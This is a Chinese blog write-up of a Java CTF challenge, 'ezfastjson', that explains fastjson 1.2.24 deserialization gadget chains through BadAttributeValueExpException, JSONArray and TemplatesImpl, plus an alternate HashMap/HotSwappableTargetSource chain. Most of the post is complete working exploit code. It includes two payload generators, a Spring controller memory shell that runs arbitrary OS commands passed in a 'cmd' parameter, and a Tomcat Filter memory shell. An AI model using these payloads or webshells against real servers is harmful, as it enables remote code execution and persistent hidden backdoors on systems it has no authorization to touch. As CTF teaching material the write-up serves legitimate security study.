---
title: 从一个题入门fastjson反序列化
date: 2026-07-03 21:05:44
tags:
---

# 前言

ezfastjson是我接触的第一个java题，断断续续也是研究了很长时间，本文将会详细介绍java题的操作流程供新手参考，毕竟有关java安全的问题难度高题量大而且入门资料很少。

环境准备：JDK8，IDEA，jd-gui

# 信息收集

首先附件是一个jar文件，我们用jd-gui工具对jar包进行反编译

![image-20260704223306402](https://gitee.com/bobrocket/img/raw/master/image-20260704223306402.png)

我们重点关注控制器部分和依赖部分，先看Unser类

```java
@RestController
public class Unser {
  @RequestMapping({"/read"})
  public String read(@RequestParam String data) {
    try {
      byte[] bytes = Base64.getDecoder().decode(data);//接收Base64编码字符串，POST data=
      ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//将 Base64 字符串还原为原始二进制字节
      ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);//将字节数组包装成一个 ObjectInputStream
      objectInputStream.readObject();//反序列化
    } catch (Exception e) {
      e.printStackTrace();
      return "error";
    } 
    return "success";
  }
}
```

这里有反序列化的入口，我们再去看一下依赖，结合题目名称fastjson1.2.24版本比较老也许有可利用的点

# 初步分析

## 入口

这里反序列化的入口是`objectInputStream.readObject();` 我们来看一下整体路线

```
readObject()
    ↓
触发目标对象的 readObject() 方法（或默认反序列化）
    ↓
调用链（Gadget Chain）：通过字段值控制调用顺序
    ↓
最终调用危险方法，例如：
    - Runtime.exec()
    - Method.invoke()
    - TemplatesImpl.newTransformer()
    - InitialContext.lookup()
    - ProcessBuilder.start()
    ↓
任意代码执行 / 远程类加载 / 数据泄露
```

## 调用链分析

### fastjson触发TemplatesImpl

可以明确的是后半段的利用

```
fastjson 处理 TemplatesImpl
 -> 调用 TemplatesImpl.getOutputProperties()
 -> getOutputProperties() 内部调用 newTransformer()
 -> newTransformer() 加载 _bytecodes
 -> 实例化继承 AbstractTranslet 的恶意类
 -> 执行恶意代码 / 注册内存马
```

通过fastjson触发危险方法，由于不出网所以这里打一个内存马，那么关键在于如何让fastjson处理TemplatesImpl

### BadAttributeValueExpException

出题人说网上有很多现成的链子可以直接拿来打，但是有关fastjson反序列化的链子大部分是这样触发的

```
 Object obj = JSON.parse(jsonString);
```

`JSON.parse() `是fastjson提供的一个方法，它的作用是把 JSON 字符串解析成 Java 对象，通过传入恶意的json让fastjson处理，从而触发危险方法，但是我们的入口是`objectInputStream.readObject()`，是不会直接调用fastjson的。

在CC5链中有一个`BadAttributeValueExpException`异常类，因被广泛用于反序列化漏洞利用链而臭名昭著

在反序列化漏洞（如 Fastjson、Jackson、CommonsCollections 变种）中，`BadAttributeValueExpException` 是一个关键的触发入口。其利用原理如下：

`BadAttributeValueExpException` 自定义了 `readObject()` 方法（反序列化时会被自动调用），其简化逻辑大致为：

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ois.defaultReadObject();  // 正常反序列化所有字段
    // 重点：反序列化完成后，调用 toString()
    valObj = valObj.toString();  // valObj 是私有字段 "val"
}
```

关键点：它在反序列化后强制调用了 `val` 字段对象的 `toString()` 方法。

也就是说，只要我们能控制它的 val 字段，就能让反序列化时自动调用：val.toString()

于是我们把 val 设置成：JSONArray

反序列化时就会变成：`BadAttributeValueExpException.readObject() -> JSONArray.toString()`

而` JSONArray.toString() `又会触发 fastjson 序列化里面的 TemplatesImpl。

### 从readObject到BadAttributeValueExpException

上面我们已经确定的是BadAttributeValueExpException可以触发fastjson序列化，那么如何从入口的`objectInputStream.readObject()`走到这里呢

Java 反序列化有一个机制：

如果某个可序列化类里定义了如下私有方法：

```java
private void readObject(ObjectInputStream ois)
```

那么在反序列化这个类的对象时，`ObjectInputStream` 会自动调用它。

`BadAttributeValueExpException` 这个类里正好有自己的 `readObject` 方法。所以当序列化流里出现这个对象：

```
BadAttributeValueExpException exception
```

反序列化过程中就会自动进入：

```
BadAttributeValueExpException.readObject()
```

这个不是你手动调用的，是 `ObjectInputStream` 框架自动调的。

## 完整利用链

至此，我们终于可以写出完整的调用链了

```
ObjectInputStream.readObject()
 -> BadAttributeValueExpException.readObject()
 -> JSONArray.toString()
 -> JSON.toJSONString()
 -> TemplatesImpl.getOutputProperties()
 -> TemplatesImpl.newTransformer()
 -> Memshell内存马
```

# 漏洞利用

```java
import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;

public class payload {
    public static void main(String[] args) throws Exception {
        byte[] bytes = readAll(new File(args.length > 0 ? args[0] : "memshell.class"));//读取恶意类字节码

        TemplatesImpl templates = new TemplatesImpl();//构建TemplatesImpl 对象
        setValue(templates, "_name", "suny");//通过反射赋值私有字段
        setValue(templates, "_bytecodes", new byte[][]{bytes});//加入字节码
        setValue(templates, "_tfactory", new TransformerFactoryImpl());

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);
		//将刚才构造的 templates 对象添加到数组。JSONArray 的 toString() 方法会遍历元素，并对每个元素调用其 getter 方法（Fastjson 的特性），从而			触发 getOutputProperties()。
        
        BadAttributeValueExpException exception = new BadAttributeValueExpException(null);
        setValue(exception, "val", jsonArray);
		//通过反射设置私有字段 val 为之前构造的 jsonArray。当该异常被反序列化时，readObject() 方法会调用 val.toString()，从而触发攻击链。
        
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(bos);
        out.writeObject(exception);
        out.close();
        System.out.print(Base64.getEncoder().encodeToString(bos.toByteArray()));
    }

    private static void setValue(Object obj, String name, Object value) throws Exception {//自定义方法利用反射设置私有字段
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    private static byte[] readAll(File file) throws Exception {//自定义方法读取文件全部字节
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        FileInputStream in = new FileInputStream(file);
        byte[] buffer = new byte[4096];
        int len;
        while ((len = in.read(buffer)) != -1) {
            bos.write(buffer, 0, len);
        }
        in.close();
        return bos.toByteArray();
    }
}
```

Spring Controller内存马

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Scanner;

public class memshell extends AbstractTranslet {
    static {
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes()
                    .getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);

            Field configField = mapping.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mapping);

            Method method = memshell.class.getMethod("shell", HttpServletRequest.class, HttpServletResponse.class);
            RequestMappingInfo info = RequestMappingInfo.paths("/shell").options(config).build();
            mapping.registerMapping(info, new memshell(), method);
        } catch (Throwable ignored) {
        }
    }

    public void shell(HttpServletRequest request, HttpServletResponse response) throws IOException {
        String cmd = request.getParameter("cmd");
        if (cmd == null) {
            response.getWriter().write("ok");
            return;
        }
        boolean isWindows = System.getProperty("os.name", "").toLowerCase().contains("win");
        String[] cmds = isWindows ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"sh", "-c", cmd};
        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
        Scanner scanner = new Scanner(in).useDelimiter("\\A");
        String output = scanner.hasNext() ? scanner.next() : "";
        response.getWriter().write(output);
        response.getWriter().flush();
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
```

运行之后会生成一串base64，直接用hackbar发包然后访问后门地址即可

![image-20260705221323084](https://gitee.com/bobrocket/img/raw/master/image-20260705221323084.png)

# 拓展解法

这个题我用ai做的结果是这个链子

```
ObjectInputStream.readObject()
 -> HashMap.readObject()
 -> HashMap.putVal()
 -> key.equals()
 -> HotSwappableTargetSource.equals()
 -> XString.equals()
 -> JSONObject.toString()
 -> JSON.toJSONString()
 -> TemplatesImpl.getOutputProperties()
 -> TemplatesImpl.newTransformer()
 -> defineTransletClasses()
 -> 加载 SpringFlagShell3.class
 -> SpringFlagShell3 构造函数执行
 -> 注册 Tomcat Filter 内存马
 -> 访问 /flag 读取 /flag
```

前半部分对fastjson序列化方法的触发以及内存马略有不同，exp贴在下面供参考

```java
import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

public class MakeFastjsonPayload {
    public static void main(String[] args) throws Exception {
        byte[] clazz = readAll(new File(args.length > 0 ? args[0] : "SpringFlagShell3.class"));

        TemplatesImpl templates = new TemplatesImpl();
        set(templates, "_bytecodes", new byte[][]{clazz});
        set(templates, "_name", "SpringFlagShell");
        set(templates, "_tfactory", new TransformerFactoryImpl());

        JSONObject jsonObject = new JSONObject();
        jsonObject.put("x", templates);

        Object exp;
        if (args.length > 1 && "badattr".equals(args[1])) {
            BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
            set(bad, "val", jsonObject);
            exp = bad;
        } else {
            Class<?> hotswapClass = Class.forName("org.springframework.aop.target.HotSwappableTargetSource");
            Object v1 = hotswapClass.getConstructor(Object.class).newInstance(jsonObject);
            Object v2 = hotswapClass.getConstructor(Object.class).newInstance(new XString("x"));
            exp = makeMap(v1, v2);
        }

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(bos);
        out.writeObject(exp);
        out.close();

        System.out.print(Base64.getEncoder().encodeToString(bos.toByteArray()));
    }

    private static void set(Object target, String name, Object value) throws Exception {
        Field field = target.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(target, value);
    }

    private static HashMap<Object, Object> makeMap(Object v1, Object v2) throws Exception {
        HashMap<Object, Object> map = new HashMap<Object, Object>();
        set(map, "size", 2);

        Class<?> nodeClass = Class.forName("java.util.HashMap$Node");
        java.lang.reflect.Constructor<?> nodeConstructor = nodeClass.getDeclaredConstructor(int.class, Object.class, Object.class, nodeClass);
        nodeConstructor.setAccessible(true);

        Object node2 = nodeConstructor.newInstance(0, v2, v2, null);
        Object node1 = nodeConstructor.newInstance(0, v1, v1, node2);
        Object table = java.lang.reflect.Array.newInstance(nodeClass, 2);
        java.lang.reflect.Array.set(table, 0, node1);
        set(map, "table", table);
        return map;
    }

    private static byte[] readAll(File file) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        FileInputStream in = new FileInputStream(file);
        byte[] buffer = new byte[4096];
        int len;
        while ((len = in.read(buffer)) != -1) {
            bos.write(buffer, 0, len);
        }
        in.close();
        return bos.toByteArray();
    }
}
```

内存马

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;

public class SpringFlagShell3 extends AbstractTranslet implements javax.servlet.Filter {
    public SpringFlagShell3() {
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Object request = currentRequest(cl);
            Object servletContext = call(request, "getServletContext");
            Object appContextFacade = get(servletContext, "context");
            Object appContext = get(appContextFacade, "context");

            Class<?> filterClass = cl.loadClass("javax.servlet.Filter");
            Class<?> filterDefClass = cl.loadClass("org.apache.tomcat.util.descriptor.web.FilterDef");
            Object filterDef = filterDefClass.newInstance();
            call(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{"flagFilter3"});
            call(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{this.getClass().getName()});
            call(filterDef, "setFilter", new Class[]{filterClass}, new Object[]{this});
            call(appContext, "addFilterDef", new Class[]{filterDefClass}, new Object[]{filterDef});

            Class<?> filterMapClass = cl.loadClass("org.apache.tomcat.util.descriptor.web.FilterMap");
            Object filterMap = filterMapClass.newInstance();
            call(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{"flagFilter3"});
            call(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{"/*"});
            call(filterMap, "setDispatcher", new Class[]{String.class}, new Object[]{"REQUEST"});
            call(appContext, "addFilterMapBefore", new Class[]{filterMapClass}, new Object[]{filterMap});

            Class<?> appFilterConfigClass = cl.loadClass("org.apache.catalina.core.ApplicationFilterConfig");
            java.lang.reflect.Constructor<?> c = appFilterConfigClass.getDeclaredConstructor(cl.loadClass("org.apache.catalina.Context"), filterDefClass);
            c.setAccessible(true);
            Object filterConfig = c.newInstance(appContext, filterDef);
            Object filterConfigs = get(appContext, "filterConfigs");
            call(filterConfigs, "put", new Class[]{Object.class, Object.class}, new Object[]{"flagFilter3", filterConfig});
            log("filter3 done");
        } catch (Throwable e) {
            log("filter3 error: " + e);
        }
    }

    public void doFilter(javax.servlet.ServletRequest request, javax.servlet.ServletResponse response, javax.servlet.FilterChain chain) throws IOException, javax.servlet.ServletException {
        try {
            Object uri = call(request, "getRequestURI");
            if (uri != null && uri.toString().equals("/flag")) {
                byte[] data = readFlag().getBytes(StandardCharsets.UTF_8);
                call(response, "setStatus", new Class[]{int.class}, new Object[]{200});
                call(response, "setContentType", new Class[]{String.class}, new Object[]{"text/plain;charset=UTF-8"});
                Object os = call(response, "getOutputStream");
                call(os, "write", new Class[]{byte[].class}, new Object[]{data});
                call(os, "flush");
                return;
            }
        } catch (Throwable e) {
            log("doFilter3 error: " + e);
        }
        chain.doFilter(request, response);
    }

    public void init(javax.servlet.FilterConfig filterConfig) {
    }

    public void destroy() {
    }

    private static String readFlag() {
        String[] paths = new String[]{"/flag", "/flag.txt", "/app/flag", "/app/flag.txt"};
        for (String path : paths) {
            try {
                File file = new File(path);
                if (file.isFile()) {
                    return new String(Files.readAllBytes(file.toPath()), StandardCharsets.UTF_8);
                }
            } catch (Throwable ignored) {
            }
        }
        return "flag not found";
    }

    private Object currentRequest(ClassLoader cl) throws Exception {
        Class<?> holderClass = cl.loadClass("org.springframework.web.context.request.RequestContextHolder");
        Object attrs = callStatic(holderClass, "getRequestAttributes");
        return call(attrs, "getRequest");
    }

    private static Object get(Object target, String name) throws Exception {
        Class<?> type = target.getClass();
        while (type != null) {
            try {
                Field field = type.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(target);
            } catch (NoSuchFieldException ignored) {
                type = type.getSuperclass();
            }
        }
        throw new NoSuchFieldException(name);
    }

    private static Object callStatic(Class<?> type, String name) throws Exception {
        Method method = type.getDeclaredMethod(name);
        method.setAccessible(true);
        return method.invoke(null);
    }

    private static Object call(Object target, String name) throws Exception {
        Method method = findMethod(target.getClass(), name, new Class[0]);
        return method.invoke(target);
    }

    private static Object call(Object target, String name, Class<?>[] types, Object[] args) throws Exception {
        Method method = findMethod(target.getClass(), name, types);
        return method.invoke(target, args);
    }

    private static Method findMethod(Class<?> type, String name, Class<?>[] types) throws Exception {
        Class<?> current = type;
        while (current != null) {
            try {
                Method method = current.getDeclaredMethod(name, types);
                method.setAccessible(true);
                return method;
            } catch (NoSuchMethodException ignored) {
                current = current.getSuperclass();
            }
        }
        Method method = type.getMethod(name, types);
        method.setAccessible(true);
        return method;
    }

    private static void log(String msg) {
        try {
            FileWriter writer = new FileWriter("/tmp/sfs.log", true);
            writer.write(msg + "\n");
            writer.close();
        } catch (Throwable ignored) {
        }
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
```



# 参考文献

[JavaWeb 内存马一周目通关攻略 | 素十八](https://su18.org/post/memory-shell/)

[【Web】浅聊Java反序列化之CC5——BadAttributeValueExpException-CSDN博客](https://blog.csdn.net/uuzeray/article/details/136587615)

[13-java安全——fastjson1.2.24反序列化TemplatesImpl利用链分析_com.alibaba.fastjson.parser.feature-CSDN博客](https://blog.csdn.net/qq_35733751/article/details/119948833)

[VNCTF2025部分WP - dynasty_chenzi - 博客园](https://www.cnblogs.com/DSchenzi/p/18707270)

[FastJason 1.2.22-1.2.24 反序列化利用链分析 - se1zer - 博客园](https://www.cnblogs.com/seizer/p/17092614.html)
